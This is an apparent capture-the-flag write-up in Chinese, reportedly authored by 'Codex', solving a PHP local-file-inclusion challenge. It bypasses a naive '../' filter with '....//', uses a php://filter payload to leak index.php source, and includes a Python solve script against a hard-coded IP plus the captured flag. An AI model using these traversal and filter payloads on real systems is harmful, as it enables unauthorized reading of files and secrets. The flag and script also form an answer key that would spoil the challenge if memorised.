---
title: "Enterprise OA"
ctf: "Unknown"
date: 2026-05-30
category: web
difficulty: easy
points: 250
flag_format: "flag{...}"
author: "Codex"
---

# Enterprise OA

## Summary

题目入口通过 `?module=` 动态 `include()` 页面内容，号称做了目录穿越防护，但实际上只是把用户输入中的字面量 `../` 替换为空。使用 `....//` 可以绕过这个过滤，最终读取到根目录下的 `flag.txt`。

## Solution

### Step 1: 识别动态包含点并读取源码

首页导航链接都是 `?module=public_notices.php` 这种形式，说明后端很可能在用用户可控参数做文件包含。  
进一步请求：

```text
/?module=php://filter/convert.base64-encode/resource=index.php
```

可以拿到 `index.php` 源码，核心逻辑如下：

```php
<?php
$module = isset($_GET['module']) ? $_GET['module'] : 'public_notices.php';
$module = str_replace('../', '', $module);
?>
...
<?php include($module); ?>
```

这里的“防护”仅仅删除了固定字符串 `../`，并没有真正做路径规范化、白名单校验或绝对路径限制。

### Step 2: 用 `....//` 绕过过滤并读取 flag

`....//` 在字符串替换阶段不等于 `../`，不会被删掉；但在路径解析时可等价落到上级目录。  
于是构造：

```text
/?module=....//....//....//flag.txt
```

服务端实际会尝试包含 `../../../flag.txt`，从 `/var/www/html/index.php` 回退到根目录后成功读取 `/flag.txt`，页面中直接回显 flag。

```python
import re
import sys

import requests


def main() -> None:
    base = sys.argv[1] if len(sys.argv) > 1 else "http://47.99.147.34:18941/"
    payload = "....//....//....//flag.txt"

    resp = requests.get(base, params={"module": payload}, timeout=10)
    match = re.search(r"flag\{[^\r\n<]+}", resp.text)

    if not match:
        raise SystemExit("flag not found")

    print(match.group(0))


if __name__ == "__main__":
    main()
```

示例运行：

```text
python solve.py
flag{23afce1d8adb0d09b9fbb8bd81324d96}
```

## Flag

```text
flag{23afce1d8adb0d09b9fbb8bd81324d96}
```
